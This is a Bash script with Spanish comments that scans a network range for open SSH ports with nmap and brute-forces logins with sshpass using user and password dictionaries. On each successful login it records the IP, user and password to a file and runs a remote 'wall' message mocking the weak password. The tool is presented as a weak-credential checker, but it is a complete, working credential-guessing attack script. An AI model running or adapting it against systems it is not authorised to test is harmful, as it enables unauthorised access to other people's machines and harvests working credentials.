#!/bin/bash

#########################################
#       Francis J. Garcia               #
#       https://francisjgarcia.es       #
#########################################################
#       Comprueba si se puede acceder a diversos        #
#       equipos via SSH mediante diccionarios           #
#       de usuarios y contraseñas y ejecuta uno         #
#       comando en cada uno de ellos.                   #
#########################################################
# Instrucciones: Escribir la red como primera variable  #
# y el puerto SSH al que se va a acceder. Si es más de  #
# uno, debe separarse por comas (,).                    #
#########################################################
## Ejemplo: ./sshcheck.sh 192.168.1.0/24 22,2222        #
#########################################################

## Instalar paquetes
apt-get install -y nmap sshpass >/dev/null

## Variables generales
Network="$1"
Port="$2"
ComandoRemoto="wall -n 'NO USES UN USUARIO Y CONTRASEÑA TAN FÁCIL :)'"
Green="\033[0;32m"
Red="\033[0;31m"
NC="\033[0m"

## Comprobación de parámtros
if [ -z $1 ] && [ -z $2 ]
then
        echo "Debes pasar como primer parámetro la dirección de red con su CIDR y los puertos que quieres buscar (separados por coma si son más de uno)."
        exit
fi

if [[ ! -f files/users.txt ]] || [[ ! -f files/passwords.txt ]]
then
        touch files/users.txt files/passwords.txt
        echo "Debes escribir al menos un usuario y una contraseña en los ficheros users.txt y passwords.txt."
fi

## Ejecutar script
clear && echo "Comprobando equipos de la red $Network con el puerto $Port abierto."
for IP in $(nmap -n -Pn $Network -p$Port -oG - | grep '/open/' | awk '/Host:/{print $2}')
do
        echo "Se han escaneado todas las posibles IPs."
        for User in $(cat files/users.txt)
        do
                echo "> Probando usuario $User."
                for Password in $(cat files/passwords.txt)
                do
                        echo ">> Probando contraseña $Password."
                        sshpass -p $Password ssh $User@$IP -o StrictHostKeychecking=no exit 2>/dev/null
                        Success=$?
                        if [ $Success -eq 0 ]
                        then
                                echo -e "${Green}Se ha podido entrar a la IP $IP con $User y la clave $Password.${NC}"
                                echo "$IP:$User:$Password" > files/acccess_granted.txt
                                sshpass -p $Password ssh $User@$IP -o StrictHostKeychecking=no "$ComandoRemoto" 2>/dev/null
                                break
                        else
                                echo -e "${Red}No se ha podido entrar a $IP con $User y la clave $Password.${NC}"
                        fi
                done
        done
done

## Script finalizado
echo "Ha finalizado la comprobación y acceso a los distintos equipos mediante SSH."
